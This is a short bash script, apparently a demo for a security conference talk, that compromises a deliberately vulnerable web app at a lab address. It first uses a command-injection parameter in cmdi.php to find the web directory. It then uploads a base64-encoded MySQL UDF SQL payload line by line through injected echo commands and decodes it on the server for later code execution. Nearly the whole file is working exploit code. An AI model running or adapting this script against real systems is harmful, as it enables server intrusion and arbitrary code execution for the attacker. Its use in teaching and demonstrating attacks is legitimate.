#!/bin/bash

#
# Quick and nasty "repeatable compromise" script
# PLUK13 Security talk
# David Busby <david.busby@percona.com>
#

vuln_webapp="http://172.16.33.2/vuln_webapp"
echo "Phase 1 - Information gathering"
webdir=`curl -s ${vuln_webapp}/cmdi.php?cmd=pwd | grep www`
echo "I detected the webdir as $webdir"
echo "Phase 2 - create payload"
i=0
cmd="echo '' > $webdir/data.b64"
cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
base64 -w 100 ./udf_51.sql | while read chunk
do
    (( i++ ))
    chunk_inject="echo -n '$chunk' >> $webdir/data.b64"
    echo "Executing payload line $i: $chunk_inject";
    cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$chunk_inject")"
    curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null
done
echo "Phase3 - unpacking payload"
cmd="base64 -d $webdir/data.b64 > $webdir/data.sql"
cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
curl -s "$vuln_webapp/cmdi.php?cmd=$cmd" > /dev/null

echo "Payload staged udf sql should be available here $vuln_webapp/data.sql"
echo "Happy hacking!"
